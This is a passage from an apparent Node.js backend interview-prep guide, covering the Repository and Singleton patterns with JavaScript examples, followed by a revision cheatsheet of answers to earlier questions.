// Problem: to test this, you need a real DB. Can't easily switch from MySQL to MongoDB.

// ✅ With Repository Pattern — clean separation
// 1. Define interface (what operations are available)
class OrderRepository {
  async findByUserId(userId)         { throw new Error('Not implemented'); }
  async findById(id)                 { throw new Error('Not implemented'); }
  async create(orderData)            { throw new Error('Not implemented'); }
  async updateStatus(id, status)     { throw new Error('Not implemented'); }
}

// 2. Concrete implementation (MySQL)
class MySQLOrderRepository extends OrderRepository {
  async findByUserId(userId) {
    return db.query(
      `SELECT o.*, p.name as product_name FROM orders o
       JOIN products p ON o.product_id = p.id
       WHERE o.user_id = ? AND o.status != 'cancelled'
       ORDER BY o.created_at DESC`,
      [userId]
    );
  }

  async create(orderData) {
    const result = await db.query('INSERT INTO orders SET ?', orderData);
    return this.findById(result.insertId);
  }
}

// 3. Test double — no DB needed
class MockOrderRepository extends OrderRepository {
  constructor() {
    super();
    this.orders = [];
  }
  async findByUserId(userId) {
    return this.orders.filter(o => o.userId === userId);
  }
  async create(data) {
    const order = { id: Date.now(), ...data };
    this.orders.push(order);
    return order;
  }
}

// 4. Service uses the interface — doesn't care which implementation
class OrderService {
  constructor(orderRepository) {    // injected
    this.orderRepo = orderRepository;
  }

  async getUserOrders(userId) {
    return this.orderRepo.findByUserId(userId);  // clean!
  }
}

// 5. Wire up
const orderService = new OrderService(new MySQLOrderRepository());
// For tests:
const orderService = new OrderService(new MockOrderRepository());
```

> 📖 Reference: [Repository Pattern — Martin Fowler](https://martinfowler.com/eaaCatalog/repository.html)

---

**Q60. What is the Singleton Pattern? Give a real backend use case where it applies.**

**Answer:**

The **Singleton Pattern** ensures a class has only **one instance** throughout the entire application lifecycle. Any code that asks for an instance gets the same one.

**Real backend use cases:**
- **Database connection pool** — one pool shared across all requests
- **Redis client** — one connection shared across all services
- **Configuration object** — loaded once, read everywhere
- **Logger instance** — one logger used throughout the app

```js
// ✅ Database pool Singleton
// db.js
const { Pool } = require('pg');

let pool = null;

function getPool() {
  if (!pool) {
    pool = new Pool({
      connectionString: process.env.DATABASE_URL,
      max: 20,
    });
    console.log('DB pool created');
  }
  return pool; // always returns the SAME pool instance
}

module.exports = { getPool };

// userRepository.js
const { getPool } = require('./db');
async function findUserById(id) {
  const pool = getPool(); // same pool instance every time
  return pool.query('SELECT * FROM users WHERE id = $1', [id]);
}

// orderRepository.js
const { getPool } = require('./db');
async function findOrdersByUser(userId) {
  const pool = getPool(); // same pool instance ✅ — not a new pool!
  return pool.query('SELECT * FROM orders WHERE user_id = $1', [userId]);
}

// ✅ ES Module Singleton (simplest — Node.js caches module exports)
// logger.js
const winston = require('winston');

// This module is cached by Node.js — same instance everywhere
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.json(),
  transports: [new winston.transports.Console()]
});

module.exports = logger;

// Anywhere in the codebase:
const logger = require('./logger'); // always the same Winston instance
```

**Important:** In Node.js, `require()` caches modules by default — meaning any exported object is effectively a singleton. This is why it's safe to export a single pool/logger/config instance directly from a module.

> 📖 Reference: [Singleton Pattern — Refactoring Guru](https://refactoring.guru/design-patterns/singleton)

---

## 🎯 Quick Revision Cheatsheet

| # | Topic | Key Point |
|---|-------|-----------|
| Q1 | Sync vs Async | Sync blocks the thread; async frees it while waiting for I/O |
| Q2 | Callback Hell | Nested callbacks = Pyramid of Doom; fix with Promises or async/await |
| Q3 | Promise states | Pending → Fulfilled or Rejected (terminal, no going back) |
| Q4 | async/await | Syntactic sugar over Promises; uses try/catch for errors |
| Q5 | Event Loop | Single thread, non-blocking I/O via callback queues; microtasks first |
| Q6 | Promise combinators | all=all succeed; race=first settles; allSettled=all finish; any=first succeeds |
| Q7 | Race condition | Two operations interfere; fix with atomic DB operations or locks |
| Q8 | I/O vs CPU-bound | Node excels at I/O; CPU-bound needs worker threads or separate service |
| Q9 | RESTful API | Nouns in URLs, correct HTTP verbs, consistent responses, proper status codes |
| Q10 | API versioning | `/v1/`, `/v2/` in URL path is most common; always add Sunset headers |
| Q12 | Pagination | Offset = simple but unstable; Cursor = stable, scalable for real-time data |
| Q13 | Idempotency | Same result if called N times; use idempotency-key for POST payments |
| Q17 | N+1 problem | 1 + N queries for N items; fix with JOIN or WHERE IN batch query |
| Q21 | Connection pooling | Reuse pre-established connections; `pool.query()` handles borrow/release |
| Q22 | Optimistic/Pessimistic locking | Optimistic=check version; Pessimistic=lock row; use based on contention |
| Q26 | Session vs JWT | Session=server-side state; JWT=stateless, client carries claims |
| Q27 | JWT structure | header.payload.signature; payload is NOT encrypted — don't put secrets in it |
| Q28 | Access/Refresh tokens | Access=short (15m); Refresh=long (30d); refresh gets new access token |
| Q29 | bcrypt | Deliberately slow hashing with salt; never store plain-text passwords |
| Q31 | CSRF | Browser auto-attaches cookies; prevent with SameSite cookie or CSRF token |
| Q33 | Error types | Operational=expected runtime failures; Programmer=bugs that should crash |
| Q34 | Error response | Consistent JSON: `{ error: { code, message, details, requestId } }` |
| Q36 | Structured logging | JSON logs queryable in production; use Winston/Pino not console.log |
| Q38 | Test pyramid | Unit (fast, isolated) → Integration → E2E (slow, full system) |
| Q40 | Mocking | Replace real deps with fakes in unit tests; use real DB in integration tests |
| Q43 | CJS vs ESM | require=sync/runtime; import=static/parse-time; ESM supports tree shaking |
| Q46 | Memory leaks | Unbounded caches, leaked event listeners, forgotten intervals |
| Q48 | dependencies vs devDependencies | dependencies=runtime; devDependencies=dev/test only |
| Q49 | semver ^ vs ~ | ^=allow minor+patch; ~=allow patch only; pin critical deps |
| Q50 | package-lock.json | Pins exact versions; always commit; use `npm ci` in pipelines |
| Q58 | SOLID | S=one job; O=extend not modify; L=substitutable; I=small interfaces; D=depend on abstractions |
| Q59 | Repository Pattern | Abstract DB queries behind interface; enables mocking and DB swaps |
| Q60 | Singleton | One shared instance; Node module cache makes this natural for DB pools/loggers |

---

## 🤝 Contributing

Found a better explanation or want to improve a code example?
- Fork the repo, update the answer, and open a PR.
- PR title format: `[Solution-Day-02] Improve answer for Q17`

---

> ⭐ Star this repo if it helped you prepare!
